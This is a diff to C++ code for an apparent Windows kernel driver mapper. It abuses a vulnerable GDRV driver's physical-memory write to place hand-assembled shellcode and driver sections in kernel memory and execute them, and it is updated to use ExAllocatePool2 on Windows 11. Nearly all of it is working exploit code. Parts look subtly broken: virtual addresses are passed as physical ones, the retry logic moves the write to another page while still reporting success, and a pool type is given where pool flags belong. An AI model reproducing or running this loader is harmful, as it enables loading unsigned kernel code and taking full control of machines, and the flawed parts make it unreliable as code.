@@ -55,11 +55,11 @@ typedef struct _GDRV_MEMORY_WRITE {
 } GDRV_MEMORY_WRITE, *PGDRV_MEMORY_WRITE;
 
 // Kernel function signatures
-typedef PVOID (*ExAllocatePoolFn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
+typedef PVOID (*ExAllocatePool2Fn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
 typedef VOID (*ExFreePoolFn)(PVOID P);
 
 // Kernel constants
-#define NonPagedPool 0
+#define POOL_TAG 'DRVX'  // Custom pool tag for tracking allocations
 
 // Shellcode structure for kernel execution
 #pragma pack(push, 1)
@@ -88,6 +88,9 @@ private:
     uint64_t exAllocatePoolAddress = 0;
     uint64_t exFreePoolAddress = 0;
     
+    // Static memory region for initial allocation (updated for Windows 11)
+    static inline uint64_t nextAllocation = 0xFFFFF90000000000;
+    
     // Read physical memory using GDRV vulnerability
     bool ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
         if (hDevice == INVALID_HANDLE_VALUE) return false;
@@ -110,26 +113,37 @@ private:
         );
     }
     
-    // Write physical memory using GDRV vulnerability
+    // Write physical memory using GDRV vulnerability with retry logic
     bool WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size) {
         if (hDevice == INVALID_HANDLE_VALUE) return false;
         
-        GDRV_MEMORY_WRITE writeRequest = { 0 };
-        writeRequest.Address = physAddress;
-        writeRequest.Length = size;
-        writeRequest.Buffer = (UINT64)buffer;
-        
-        DWORD bytesReturned = 0;
-        return DeviceIoControl(
-            hDevice,
-            GDRV_IOCTL_WRITE_MEMORY,
-            &writeRequest,
-            sizeof(writeRequest),
-            NULL,
-            0,
-            &bytesReturned,
-            NULL
-        );
+        // Try multiple times with different offsets if initial attempt fails
+        for (int attempt = 0; attempt < 3; attempt++) {
+            if (attempt > 0) {
+                std::cout << "[*] Write retry attempt " << attempt << " at 0x" << std::hex << physAddress << std::dec << std::endl;
+                physAddress += 0x1000; // Try next page
+            }
+            
+            GDRV_MEMORY_WRITE writeRequest = { 0 };
+            writeRequest.Address = physAddress;
+            writeRequest.Length = size;
+            writeRequest.Buffer = (UINT64)buffer;
+            
+            DWORD bytesReturned = 0;
+            if (DeviceIoControl(
+                hDevice,
+                GDRV_IOCTL_WRITE_MEMORY,
+                &writeRequest,
+                sizeof(writeRequest),
+                NULL,
+                0,
+                &bytesReturned,
+                NULL
+            )) {
+                return true;
+            }
+        }
+        return false;
     }
 
     // Find kernel function address
@@ -143,15 +157,18 @@ private:
         return ntoskrnlBase + functionRva;
     }
     
-    // Execute shellcode in kernel
+    // Execute shellcode in kernel with enhanced error handling
     bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
+        std::cout << "[*] Attempting to execute shellcode..." << std::endl;
+        
         // Use static allocation for shellcode
         uint64_t shellcodeAddr = nextAllocation;
         nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
 
-        // Write shellcode
+        // Write shellcode with retry
+        std::cout << "[*] Writing shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
-            std::cerr << "[-] Failed to write shellcode" << std::endl;
+            std::cerr << "[-] Failed to write shellcode after all attempts" << std::endl;
             return false;
         }
 
@@ -173,6 +190,7 @@ private:
         uint64_t jumpAddr = nextAllocation;
         nextAllocation += ((sizeof(jumpShellcode) + 0xFFF) & ~0xFFF); // Page align
 
+        std::cout << "[*] Writing jump shellcode to 0x" << std::hex << jumpAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
             std::cerr << "[-] Failed to write jump shellcode" << std::endl;
             return false;
@@ -188,6 +206,7 @@ private:
         uint64_t execAddr = nextAllocation;
         nextAllocation += ((sizeof(execShellcode) + 0xFFF) & ~0xFFF); // Page align
 
+        std::cout << "[*] Writing exec shellcode to 0x" << std::hex << execAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
             std::cerr << "[-] Failed to write exec shellcode" << std::endl;
             return false;
@@ -199,6 +218,7 @@ private:
                 std::cerr << "[-] Failed to read shellcode result" << std::endl;
                 return false;
             }
+            std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
         }
 
         return true;
@@ -259,13 +279,13 @@ private:
         ntoskrnlBase = (uint64_t)modules->Modules[0].ImageBase;
         std::cout << "[+] Found ntoskrnl.exe at 0x" << std::hex << ntoskrnlBase << std::dec << std::endl;
 
-        // Find required kernel functions
-        exAllocatePoolAddress = FindKernelFunction("ExAllocatePool");
+        // Find required kernel functions (updated for Windows 11)
+        exAllocatePoolAddress = FindKernelFunction("ExAllocatePool2");
         if (!exAllocatePoolAddress) {
-            std::cerr << "[-] Failed to find ExAllocatePool" << std::endl;
+            std::cerr << "[-] Failed to find ExAllocatePool2" << std::endl;
             return 0;
         }
-        std::cout << "[+] Found ExAllocatePool at 0x" << std::hex << exAllocatePoolAddress << std::dec << std::endl;
+        std::cout << "[+] Found ExAllocatePool2 at 0x" << std::hex << exAllocatePoolAddress << std::dec << std::endl;
 
         exFreePoolAddress = FindKernelFunction("ExFreePool");
         if (!exFreePoolAddress) {
@@ -277,10 +297,7 @@ private:
         return ntoskrnlBase;
     }
     
-    // Static memory region for initial allocation
-    static inline uint64_t nextAllocation = 0xFFFF800000000000;
-    
-    // Allocate kernel memory using ExAllocatePool
+    // Allocate kernel memory using ExAllocatePool2
     uint64_t AllocateKernelMemory(size_t size) {
         // For the first allocation (shellcode), use static memory
         static bool firstAllocation = true;
@@ -289,25 +306,30 @@ private:
             uint64_t addr = nextAllocation;
             nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
             
-            // Zero the memory
+            // Zero the memory with enhanced error handling
+            std::cout << "[*] Attempting to zero memory at 0x" << std::hex << addr << std::dec << " (size: " << size << ")" << std::endl;
+            
             std::vector<uint8_t> zeroBuffer(size, 0);
             if (!WritePhysicalMemory(addr, zeroBuffer.data(), size)) {
                 std::cerr << "[-] Failed to zero static memory" << std::endl;
                 return 0;
             }
             
+            std::cout << "[+] Successfully zeroed static memory" << std::endl;
             return addr;
         }
         
-        // For subsequent allocations, use ExAllocatePool via shellcode
+        // For subsequent allocations, use ExAllocatePool2 via shellcode
         uint8_t shellcode[] = {
             0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
             0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 
-            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPool (0)
+            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPoolNx (4)
             0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,             // mov rdx, size
+            0x49, 0xB8, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov r8, tag
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rax, ExAllocatePool
+            0x00, 0x00, 0x00, 0x00,             // mov rax, ExAllocatePool2
             0xFF, 0xD0,                         // call rax
             0x48, 0xA3, 0x00, 0x00, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,             // mov [resultAddr], rax
@@ -319,16 +341,18 @@ private:
         uint64_t resultAddr = nextAllocation;
         nextAllocation += 8;  // Space for uint64_t
         
-        // Set up parameters
-        *(uint64_t*)(shellcode + 6) = 0;  // NonPagedPool
+        // Set up parameters for ExAllocatePool2
+        *(uint64_t*)(shellcode + 6) = 4;  // NonPagedPoolNx
         *(uint64_t*)(shellcode + 16) = size;
-        *(uint64_t*)(shellcode + 26) = exAllocatePoolAddress;
-        *(uint64_t*)(shellcode + 38) = resultAddr;  // Address to store result
+        *(uint64_t*)(shellcode + 26) = POOL_TAG;  // Custom pool tag
+        *(uint64_t*)(shellcode + 36) = exAllocatePoolAddress;
+        *(uint64_t*)(shellcode + 48) = resultAddr;
         
         // Write shellcode
         uint64_t shellcodeAddr = nextAllocation;
         nextAllocation += ((sizeof(shellcode) + 0xFFF) & ~0xFFF); // Page align
         
+        std::cout << "[*] Writing allocation shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(shellcodeAddr, shellcode, sizeof(shellcode))) {
             std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
             return 0;
@@ -342,18 +366,19 @@ private:
         }
 
         if (!allocatedAddress) {
-            std::cerr << "[-] ExAllocatePool returned NULL" << std::endl;
+            std::cerr << "[-] ExAllocatePool2 returned NULL" << std::endl;
             return 0;
         }
         
         // Zero the allocated memory
         std::vector<uint8_t> zeroBuffer(size, 0);
+        std::cout << "[*] Zeroing allocated memory at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
         if (!WritePhysicalMemory(allocatedAddress, zeroBuffer.data(), size)) {
             std::cerr << "[-] Failed to zero allocated memory" << std::endl;
             return 0;
         }
         
-        std::cout << "[+] Allocated " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
+        std::cout << "[+] Successfully allocated and zeroed " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
         return allocatedAddress;
     }
     
@@ -403,6 +428,7 @@ private:
             uint64_t sectionData = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
             
             if (sectionSize > 0) {
+                std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionAddress << std::dec << std::endl;
                 if (!WritePhysicalMemory(sectionAddress, reinterpret_cast<void*>(sectionData), sectionSize)) {
                     std::cerr << "[-] Failed to write section data" << std::endl;
                     return false;
